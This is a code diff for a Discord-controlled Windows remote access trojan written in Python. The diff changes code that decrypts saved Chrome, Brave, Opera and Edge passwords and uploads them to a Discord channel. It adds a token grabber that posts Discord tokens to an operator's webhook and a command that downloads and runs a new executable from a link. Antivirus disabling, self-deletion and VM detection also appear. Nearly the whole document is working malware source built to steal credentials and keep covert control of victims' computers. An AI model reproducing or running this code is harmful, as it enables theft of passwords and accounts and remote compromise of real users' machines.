@@ -198,7 +198,8 @@ async def on_ready():
                             username = r[1]
                             encrypted_password = r[2]
                             decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("GooglePasswords.txt","a") as f:
+                            temp = (os.getenv("temp"))
+                            with open(temp + "\\GooglePasswords.txt","a", encoding='utf-8') as f:
                                 f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                 f.close()
                     except Exception as e:
@@ -236,7 +237,8 @@ async def on_ready():
                             username = r[1]
                             encrypted_password = r[2]
                             decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("BravePasswords.txt","a") as f:
+                            temp = (os.getenv("temp"))
+                            with open(temp + "\\BravePasswords.txt","a", encoding='utf-8') as f:
                                 f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                 f.close()  
                     except Exception as e:
@@ -274,7 +276,8 @@ async def on_ready():
                             username = r[1]
                             encrypted_password = r[2]
                             decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("OperaPasswords.txt","a") as f:
+                            temp = (os.getenv("temp"))
+                            with open(temp + "\\OperaPasswords.txt","a", encoding='utf-8') as f:
                                 f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                 f.close()
                     except Exception as e:
@@ -312,7 +315,8 @@ async def on_ready():
                             username = r[1]
                             encrypted_password = r[2]
                             decrypted_password = decrypt_password(encrypted_password, master_key)
-                            with open("EdgePasswords.txt","a") as f:
+                            temp = (os.getenv("temp"))
+                            with open(temp + "\\EdgePasswords.txt","a" , encoding='utf-8') as f:
                                 f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                                 f.close()             
                     except Exception as e:
@@ -325,35 +329,34 @@ async def on_ready():
                         pass
             except FileNotFoundError:
                 pass
-
-
-            ## Send Found Data
+            
+            temp = (os.getenv("temp"))
             try:
-                file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
+                file1 = discord.File(temp + "\\GooglePasswords.txt", filename="GooglePasswords.txt")
                 await channel.send("Found GooglePasswords", file=file1)
             except FileNotFoundError:
-                await channel.send("User has not got CHROME downloaded!")
+                await channel.send("No CHROME passwords found!")
 
             try:
-                file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
+                file2 = discord.File(temp + "\\BravePasswords.txt", filename="BravePasswords.txt")
                 await channel.send("Found BravePasswords", file=file2)
             except FileNotFoundError:
-                await channel.send("User has not got BRAVE downloaded!")
+                await channel.send("No BRAVE passwords found!")
 
             try:
-                file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
+                file3 = discord.File(temp + "\\OperaPasswords.txt", filename="OperaPasswords.txt")
                 await channel.send("Found OperaPasswords", file=file3)
             except FileNotFoundError:
-                await channel.send("User has not got OPERA downloaded!")
+                await channel.send("No OPERA passwords found!")
 
             try:
-                file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
+                file4 = discord.File(temp + "\\EdgePasswords.txt", filename="EdgePasswords.txt")
                 await channel.send("Found EdgePasswords", file=file4)
             except FileNotFoundError:
-                await channel.send("User has not got EDGE downloaded!")
+                await channel.send("No EDGE passwords found!")
 
-
-            os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")        
+            temp = (os.getenv("temp"))
+            os.system(f"del /f {temp}\\EdgePasswords.txt {temp}\\GooglePasswords.txt {temp}\\BravePasswords.txt {temp}\\OperaPasswords.txt")
 
         if (Auto_DisableAV):
             class disable_fsr():
@@ -365,7 +368,7 @@ async def on_ready():
                 def __exit__(self, type, value, traceback):
                     if self.success:
                         self.revert(self.old_value)
-            await channel.send("**Attempting to get admin!**")
+            await channel.send("**Attempting to disable AV!**")
 
             ###### CREATE BATCH FILE ######
             temp = (os.getenv("temp"))
@@ -704,101 +707,84 @@ async def stopKeyLogger_command(ctx: SlashContext):
 
 
 @slash.slash(name="tokens", description="get all their discord tokens", guild_ids=g)
-async def tokens_command(ctx: SlashContext):
+async def tokens_command(ctx: SlashContext, users_webhook: str, ping: bool):
     if ctx.channel.name == channel_name:
         await ctx.send("Extracting tokens please wait. . .")
         import os
-        from re import findall
-        from json import loads
-        from base64 import b64decode
+        import re
+        import json
+
         from urllib.request import Request, urlopen
-        LOCAL = os.getenv("LOCALAPPDATA")
-        ROAMING = os.getenv("APPDATA")
-        tokens_path = ROAMING + "\\.caches~$.txt"
-        f = open(tokens_path, 'r+')
-        f.truncate(0)
-        PATHS = {
-            "Discord"           : ROAMING + "\\Discord",
-            "Discord Canary"    : ROAMING + "\\discordcanary",
-            "Discord PTB"       : ROAMING + "\\discordptb",
-            "Google Chrome"     : LOCAL + "\\Google\\Chrome\\User Data\\Default",
-            "Opera"             : ROAMING + "\\Opera Software\\Opera Stable",
-            "Brave"             : LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
-            "Yandex"            : LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
-        }
-        def getheaders(token=None, content_type="application/json"):
-            headers = {
-                "Content-Type": content_type,
-                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
-            }
-            if token:
-                headers.update({"Authorization": token})
-            return headers
-        def getuserdata(token):
-            try:
-                return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getheaders(token))).read().decode())
-            except:
-                pass
-        def gettokens(path):
-            path += "\\Local Storage\\leveldb"
+
+        # your webhook URL
+        WEBHOOK_URL = users_webhook
+
+        # mentions you when you get a hit
+        PING_ME = ping
+
+        def find_tokens(path):
+            path += '\\Local Storage\\leveldb'
+
             tokens = []
+
             for file_name in os.listdir(path):
-                if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                     continue
-                for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
-                    for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                        for token in findall(regex, line):
+
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
                             tokens.append(token)
             return tokens
+
         def main():
-            tokens_path = ROAMING + "\\.caches~$.txt"
-            cache_path = ROAMING + "\\.cache~$"
-            working = []
-            checked = []
-            already_cached_tokens = []
-            working_ids = []
-            for platform, path in PATHS.items():
+            local = os.getenv('LOCALAPPDATA')
+            roaming = os.getenv('APPDATA')
+
+            paths = {
+                'Discord': roaming + '\\Discord',
+                'Discord Canary': roaming + '\\discordcanary',
+                'Discord PTB': roaming + '\\discordptb',
+                'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+                'Opera': roaming + '\\Opera Software\\Opera Stable',
+                'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+                'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+            }
+
+            message = '@everyone' if PING_ME else ''
+
+            for platform, path in paths.items():
                 if not os.path.exists(path):
-                    continue         
-                for token in gettokens(path):
-                    if token in checked:
-                        continue
-                    checked.append(token)
-                    uid = None
-                    if not token.startswith("mfa."):
-                        try:
-                            uid = b64decode(token.split(".")[0].encode()).decode()
-                        except:
-                            pass
-                        if not uid or uid in working_ids:
-                            continue
-                    user_data = getuserdata(token)
-                    if not user_data:
-                        continue
-                    working_ids.append(uid)
-                    working.append(token)
-                    f = open(tokens_path, 'a+')
-                    f.write(f'{token}\n\n')
-                    f.close()
-                    
-            with open(cache_path, "a") as file:
-                for token in checked:
-                    if not token in already_cached_tokens:
-                        file.write(token + "\n")
-            if len(working) == 0:
-                working.append('123')
+                    continue
 
-        try:
+                message += f'\n**{platform}**\n```\n'
+
+                tokens = find_tokens(path)
+
+                if len(tokens) > 0:
+                    for token in tokens:
+                        message += f'{token}\n'
+                else:
+                    message += 'No tokens found.\n'
+
+                message += '```'
+
+            headers = {
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'
+            }
+
+            payload = json.dumps({'content': message})
+
+            try:
+                req = Request(WEBHOOK_URL, data=payload.encode(), headers=headers)
+                urlopen(req)
+            except:
+                pass
+
+        if __name__ == '__main__':
             main()
-            tokens_path = ROAMING + "\\.caches~$.txt"
-            file1 = open(tokens_path, 'r')
-            data = file1.read()
-            embed = discord.Embed(title="Found Tokens", description=f"```{data}```")
-            await ctx.send(embed=embed)
-
-        except Exception as e:
-            await ctx.send(f"**Error occured** ```{e}```")
-            pass
+            await ctx.send("Finished extracting tokens")
 
 
 @slash.slash(name="windowstart", description="start the window logger", guild_ids=g)
@@ -1330,7 +1316,7 @@ async def GrabPasswords_command(ctx: SlashContext):
         await ctx.send("Grabbing Passwords. . .")
         import json, base64, sqlite3, win32crypt, shutil, getpass, os
         from Crypto.Cipher import AES
-
+            
 
         def decrypt_payload(cipher, payload):
             return cipher.decrypt(payload)
@@ -1374,7 +1360,8 @@ async def GrabPasswords_command(ctx: SlashContext):
                         username = r[1]
                         encrypted_password = r[2]
                         decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("GooglePasswords.txt","a") as f:
+                        temp = (os.getenv("temp"))
+                        with open(temp + "\\GooglePasswords.txt","a", encoding='utf-8') as f:
                             f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                             f.close()
                 except Exception as e:
@@ -1412,7 +1399,8 @@ async def GrabPasswords_command(ctx: SlashContext):
                         username = r[1]
                         encrypted_password = r[2]
                         decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("BravePasswords.txt","a") as f:
+                        temp = (os.getenv("temp"))
+                        with open(temp + "\\BravePasswords.txt","a", encoding='utf-8') as f:
                             f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                             f.close()  
                 except Exception as e:
@@ -1450,7 +1438,8 @@ async def GrabPasswords_command(ctx: SlashContext):
                         username = r[1]
                         encrypted_password = r[2]
                         decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("OperaPasswords.txt","a") as f:
+                        temp = (os.getenv("temp"))
+                        with open(temp + "\\OperaPasswords.txt","a", encoding='utf-8') as f:
                             f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                             f.close()
                 except Exception as e:
@@ -1488,7 +1477,8 @@ async def GrabPasswords_command(ctx: SlashContext):
                         username = r[1]
                         encrypted_password = r[2]
                         decrypted_password = decrypt_password(encrypted_password, master_key)
-                        with open("EdgePasswords.txt","a") as f:
+                        temp = (os.getenv("temp"))
+                        with open(temp + "\\EdgePasswords.txt","a" , encoding='utf-8') as f:
                             f.write("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "-" * 15 + "cookiesservices.xyz" + "-" * 15 + "\n")
                             f.close()             
                 except Exception as e:
@@ -1501,35 +1491,34 @@ async def GrabPasswords_command(ctx: SlashContext):
                     pass
         except FileNotFoundError:
             pass
-
-
-        ## Send Found Data
+        
+        temp = (os.getenv("temp"))
         try:
-            file1 = discord.File("GooglePasswords.txt", filename="GooglePasswords.txt")
+            file1 = discord.File(temp + "\\GooglePasswords.txt", filename="GooglePasswords.txt")
             await ctx.send("Found GooglePasswords", file=file1)
         except FileNotFoundError:
-            await ctx.send("User has not got CHROME downloaded!")
+            await ctx.send("No CHROME passwords found!")
 
         try:
-            file2 = discord.File("BravePasswords.txt", filename="BravePasswords.txt")
+            file2 = discord.File(temp + "\\BravePasswords.txt", filename="BravePasswords.txt")
             await ctx.send("Found BravePasswords", file=file2)
         except FileNotFoundError:
-            await ctx.send("User has not got BRAVE downloaded!")
+            await ctx.send("No BRAVE passwords found!")
 
         try:
-            file3 = discord.File("OperaPasswords.txt", filename="OperaPasswords.txt")
+            file3 = discord.File(temp + "\\OperaPasswords.txt", filename="OperaPasswords.txt")
             await ctx.send("Found OperaPasswords", file=file3)
         except FileNotFoundError:
-            await ctx.send("User has not got OPERA downloaded!")
+            await ctx.send("No OPERA passwords found!")
 
         try:
-            file4 = discord.File("EdgePasswords.txt", filename="EdgePasswords.txt")
+            file4 = discord.File(temp + "\\EdgePasswords.txt", filename="EdgePasswords.txt")
             await ctx.send("Found EdgePasswords", file=file4)
         except FileNotFoundError:
-            await ctx.send("User has not got EDGE downloaded!")
+            await ctx.send("No EDGE passwords found!")
 
-
-        os.system("del /f EdgePasswords.txt GooglePasswords.txt BravePasswords.txt OperaPasswords.txt")
+        temp = (os.getenv("temp"))
+        os.system(f"del /f {temp}\\EdgePasswords.txt {temp}\\GooglePasswords.txt {temp}\\BravePasswords.txt {temp}\\OperaPasswords.txt")
 
 
 @slash.slash(name="StartProc", description="Starts process using DIR", guild_ids=g)
@@ -1544,15 +1533,14 @@ async def SelfDestruct_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
         import os
         import sys
-        import inspect
         uncritproc()
         pid = os.getpid()
         temp = (os.getenv("temp"))
         cwd = os.getcwd()
         cwd2 = sys.argv[0]
         rat_path = f'{cwd}\\{cwd2}.exe'
-        ###### Remove temp files ######
-        data = f"Killed Rat PID: **{pid}**\n\nRemoved rat file!"
+        ###### SELF DESTRUCT RAT FILES ######
+        data = f"Killed Rat PID: {pid}\n\nRemoved rat file!"
         embed = discord.Embed(title="Self Destruct Complete", description=f"```{data}```")
         await ctx.send(embed=embed)
         bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
@@ -1563,6 +1551,37 @@ async def SelfDestruct_command(ctx: SlashContext):
         f6.write(bat)
         f6.close()
         os.system(r"start /min %temp%\\kill.bat")
+
+
+@slash.slash(name="Update", description="New update feature (use link eg. discord.com/attachments/file.exe)", guild_ids=g)
+async def Update_command(ctx: SlashContext, update_link: str):
+    if ctx.channel.name == channel_name:
+        await ctx.send("Updating RAT please wait. . .")
+        #### DOWNLOAD AND RUN NEW VERSION ####
+        import os, requests, sys
+        uncritproc()
+        cwd = os.getcwd()
+        payload_name = os.path.splitext(os.path.basename(__file__))[0]
+        r = requests.get(update_link, allow_redirects=True)
+        open(cwd + f'\\{payload_name}.exe', 'wb').write(r.content)
+        os.startfile(cwd + f'\\{payload_name}.exe')
+        #### DELETE OLD VERSION  ####
+        pid = os.getpid()
+        temp = (os.getenv("temp"))
+        cwd2 = sys.argv[0]
+        rat_path = f'{cwd}\\{cwd2}.exe'
+        data = f"Downloaded new version\n\nKilled Rat PID: {pid}\n\nRemoved rat file!"
+        embed = discord.Embed(title="Update Complete", description=f"```{data}```")
+        await ctx.send(embed=embed)
+        bat = """@echo off\n""" + "taskkill" + r" /F /PID " + str(pid) + "\n" + 'timeout 1 > NUL\n' + "del " + '"' + cwd2 + '"\n' + 'timeout 3 > NUL\n' + r"""start /b "" cmd /c del "%~f0"&exit /b\n"""
+        temp6 = temp + r"\\kill.bat"
+        if os.path.isfile(temp6):
+            os.remove(temp6)
+        f6 = open(temp + r"\\kill.bat", 'w')
+        f6.write(bat)
+        f6.close()
+        os.system(r"start /min %temp%\\kill.bat")
+        
 
 
 @slash.slash(name="StartWebsite", description="Start website link on users PC", guild_ids=g)
@@ -1780,12 +1799,11 @@ async def listProccess_command(ctx: SlashContext):
 @slash.slash(name="VmCheck", description="Detect if the victim is using a VM", guild_ids=g)
 async def VmCheck_command(ctx: SlashContext):
     if ctx.channel.name == channel_name:
-        await ctx.send("Scanning System for Vm Drivers. . .")
+        await ctx.send("Scanning System for VM Drivers. . .")
 
         sys.stdout.write("\x1b[8;{rows};{cols}t".format(rows=35, cols=170))
 
-        FOUND = False
-        FOUND_DRIVER = False
+        FOUND_VM_DRIVER = 0
 
         time.sleep(2)
         VmCehck1 = "vmsrvc.exe"
@@ -1797,91 +1815,89 @@ async def VmCheck_command(ctx: SlashContext):
         for process in psutil.process_iter():
             try:
                 if process.name().lower() == VmCehck1.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck2.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck3.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck4.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck5.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
 
                 if process.name().lower() == VmCehck6.lower():
-                    FOUND = True
+                    FOUND_VM_DRIVER += 1
                 else:
                     shit = 12
             except AccessDenied:
                 await ctx.send("[!] Perimission Denied")
-        if FOUND == True:
-            await ctx.send("Found a VM Process!")
-            return
 
-        vmci = os.path.exists("C:\WINDOWS\system32\drivers\vmci.sys")
-        vmhgfs = os.path.exists("C:\WINDOWS\system32\drivers\vmhgfs.sys")
-        vmmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmmouse.sys")
-        vmsci = os.path.exists("C:\WINDOWS\system32\drivers\vmsci.sys")
-        vmusbmouse = os.path.exists("C:\WINDOWS\system32\drivers\vmusbmouse.sys")
-        vmx_svga = os.path.exists("C:\WINDOWS\system32\drivers\vmx_svga.sys")
-        VBoxMouse = os.path.exists("C:\WINDOWS\system32\drivers\VBoxMouse.sys")
+        vmci = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmci.sys")
+        vmhgfs = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmhgfs.sys")
+        vmmouse = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmmouse.sys")
+        vmsci = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmsci.sys")
+        vmusbmouse = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmusbmouse.sys")
+        vmx_svga = os.path.exists("C:\\WINDOWS\\system32\\drivers\\vmx_svga.sys")
+        VBoxMouse = os.path.exists("C:\\WINDOWS\\\drivers\\VBoxMouse.sys")
         
         
         if vmci == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
            shit = 12
         
         if vmhgfs == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
             shit = 12
     
         if vmmouse == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
             shit = 12
         
         if vmsci == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
             shit = 12
         
         if vmusbmouse == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
             shit = 12
         
         if vmx_svga == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
             shit = 12
         
         if VBoxMouse == True:
-            FOUND_DRIVER = True
+            FOUND_VM_DRIVER += 1
         else:
                 shit = 12
 
-        if FOUND_DRIVER == True:
-            await ctx.send("Found a VM Driver!")
+        if FOUND_VM_DRIVER > 0:
+            await ctx.send("VM Detected!")
             return
         else:
-            await ctx.send("Finished checking for VM No Drivers found")
+            await ctx.send("No VM Detected")
         
 
 client.run(token)
 
 ########################### Code Functions Start ###########################
+# error occured. . .
